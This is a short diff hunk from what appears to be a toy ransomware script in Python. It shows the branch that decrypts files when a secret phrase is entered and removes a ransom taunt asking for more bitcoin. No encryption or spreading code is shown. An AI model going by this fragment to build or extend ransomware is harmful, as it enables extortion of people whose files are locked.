@@ -45,11 +45,9 @@ if (usr_inp == secretphrase):
             
         with open(file,"wb") as thefile:
             thefile.write(content_decrypted)
-            
-            print("CONGRATULATION'S!!!!!")
+           
             print("Your files are Decrypted Now !!!!")
 
 else:
 
     print("OOP'S WRONG phrase!!!!")
-    print("Give me MORE BITCOIN'S...")
